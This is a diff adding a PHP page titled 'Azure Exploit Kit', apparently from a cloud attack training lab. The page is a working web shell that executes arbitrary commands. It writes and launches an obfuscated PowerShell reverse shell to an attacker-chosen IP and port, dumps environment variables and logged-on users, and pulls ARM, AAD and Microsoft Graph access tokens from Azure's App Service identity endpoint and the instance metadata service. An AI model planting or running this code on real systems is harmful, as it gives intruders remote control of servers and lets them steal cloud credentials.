@@ -1,0 +1,152 @@
+
+<!DOCTYPE html>
+<html>
+<head><title>Azure Exploit Kit</title></head>
+<body>
+<h2>Web Shell</h2>
+<form>
+<label>CMD: <input type="text" name="cmd"/></label><br/>
+<input type="submit"><br/>
+<?php if (isset($_GET['cmd'])) {
+    print("<textarea cols=100 rows=10>");
+    system($_GET['cmd']);
+    print("</textarea>");
+}
+?>
+</form>
+<h2>Reverse Shell</h2>
+<form>
+<label>IP:<input type="text" name="ip"></label><br/>
+<label>Port:<input type="text" name="port"></label><br>
+<input type="submit"><br/>
+</form>
+<?php
+if (isset($_GET['ip']) && isset($_GET['port'])) {
+    $tmpfname = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'student68.ps1';
+    $handle = fopen($tmpfname, "w");
+    fwrite($handle, 'function Power
+{ 
+
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+    
+    try 
+    {
+        $String = "stekcoS.teN"
+        $class = ([regex]::Matches($String,".","RightToLeft") | ForEach {$_.value}) -join ""
+        if ($Reverse)
+        {
+            $client = New-Object System.$class.TCPClient($IPAddress,$Port)
+        }
+
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + ">")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + "PS " + (Get-Location).Path + "> "
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}');
+    fclose($handle);
+    print('powershell ". ' . $tmpfname . ';Power -Reverse -IPAddress ' .  $_GET['ip'] . ' -Port ' . $_GET['port'] . '"');
+    system('powershell ". ' . $tmpfname . ';Power -Reverse -IPAddress ' .  $_GET['ip'] . ' -Port ' . $_GET['port'] . '"');
+}
+?>
+<h2>Environment</h2>
+<textarea cols=100 rows=10><?php var_dump(getenv()); ?></textarea>
+<h2>Other Users</h2>
+<textarea cols=100 rows=10><?php system("query user"); ?></textarea>
+<h2>App Service Tokens</h2>
+<?php
+if (isset($_GET['get_service_tokens'])) {
+    print("<h4>ARM Token</h4><textarea cols=100 rows=10>");
+    system('curl "$IDENTITY_ENDPOINT?resource=https://management.core.windows.net/&api-version=2017-09-01&client_id=1950a258-227b-4e31-a9cf-717495945fc2" -H secret:$IDENTITY_HEADER');
+    print("</textarea><h4>AAD Token</h4><textarea cols=100 rows=10>");
+    system('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01&client_id=1b730954-1685-4b74-9bfd-dac224a7b894" -H secret:$IDENTITY_HEADER');
+    print("</textarea><h4>MS Graph Token</h4><textarea cols=100 rows=10>");
+    system('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01&client_id=1b730954-1685-4b74-9bfd-dac224a7b894" -H secret:$IDENTITY_HEADER');
+    print("</textarea>");
+} else {
+?>
+<form><input type="hidden" name="get_service_tokens" value=""/><input type="submit"></form>
+<?php } ?>
+<h2>Managed Identity Tokens</h2>
+<?php
+if (isset($_GET['get_identity_tokens'])) {
+    print("<h4>ARM Token</h4><textarea cols=100 rows=10>");
+    system('curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.core.windows.net/&client_id=1950a258-227b-4e31-a9cf-717495945fc2"');
+    print("</textarea>");
+    print("<h4>AAD Token</h4><textarea cols=100 rows=10>");
+    system('curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894"');
+    print("</textarea>");
+    print("<h4>MS Graph Token</h4><textarea cols=100 rows=10>");
+    system('curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/&client_id=1b730954-1685-4b74-9bfd-dac224a7b894"');
+    print("</textarea>");
+} else {
+?>
+<form><input type="hidden" name="get_identity_tokens" value=""/><input type="submit"></form>
+<?php } ?>
+</body>
+</html>
